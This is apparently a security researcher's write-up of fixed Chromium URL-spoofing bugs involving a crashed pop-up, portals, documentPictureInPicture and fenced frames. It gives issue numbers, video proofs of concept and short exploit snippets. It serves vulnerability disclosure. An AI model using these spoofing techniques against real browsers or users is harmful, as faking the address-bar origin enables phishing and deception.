---
title: URL Spoof
---

# Crashing (Fixed)

By crashing a cross-origin pop-up then navigating it to `data:html,foo` which gets blocked, The URL would stay cross-site but the page would be same-origin
[Issue 40054631](https://issues.chromium.org/issues/40054631) was duplicate but made a good twitter background.

Later there was a ghost image issue where the page stayed cross-origin but the contents of the previous page showed [Issue 40057561](https://issues.chromium.org/issues/40057561) was awarded $1000

I also tried the same thing with portals <https://issues.chromium.org/40064170> and it worked. [video PoC](https://www.youtube.com/watch?v=yy7dR88RIHw)

```js
// --enable-features=Portals,PortalsCrossOrigin
// onclick is optional
onclick = () => {
  portal = document.createElement('portal');
  // Victim page crashs
  portal.src = 'https://ndev.tk/crashself.html';
  document.body.appendChild(portal);
  setTimeout(() => {
    // HTTP STATUS 204
    portal.src = 'https://terjanq.me/xss.php?status=204';
    portal.activate();
  }, 6000);
};
```

These attacks where migrated by needing to crash cross-site, however [Issue 40054631](https://issues.chromium.org/issues/40054631) had a way to do it similar to the [crossOriginIsolated bypass](https://ndevtk.github.io/writeups/2021/12/30/crossoriginisolated-bypass/) and any extension can crash any tab [Issue 40848497](https://issues.chromium.org/issues/40848497)

# documentPictureInPicture (Fixed)

Did not update security UI on `about:blank` navigations so any window reference allows for a spoof. [video PoC](https://www.youtube.com/watch?v=yiAr4J-e6P8)

- Enable feature `chrome://flags/#document-picture-in-picture-api` (in Origin Trial)
- On victim page do `documentPictureInPicture.requestWindow();`
- Victim PiP opens popup to attacker page like `open('https://example.org', '', 'popup=1');`
- On attacker page run `opener.location = 'about:blank';` and notice security UI did not update.
- On attacker page run `opener.document.write('foo');`

This was fixed in <https://issues.chromium.org/40062959> by ensuring subsequent about:blank loads close the PiP window.
First patch was bypassable by using the extension `chrome.tabs.discard()` API. [video PoC](https://www.youtube.com/watch?v=yH-Cd0wWJEU).

When using fenced frames `documentPictureInPicture` would display the top-page origin not the embed.

```js
f = document.createElement('fencedframe');
f.src =
  'https://terjanq.me/xss.php?h[Supports-Loading-Mode]=fenced-frame&js=onclick=()=>documentPictureInPicture.requestWindow();';
document.body.appendChild(f);
```

This was fixed in <https://issues.chromium.org/40062954> <https://issues.chromium.org/40063068> by making it so non-topmost frames can't open PiP.
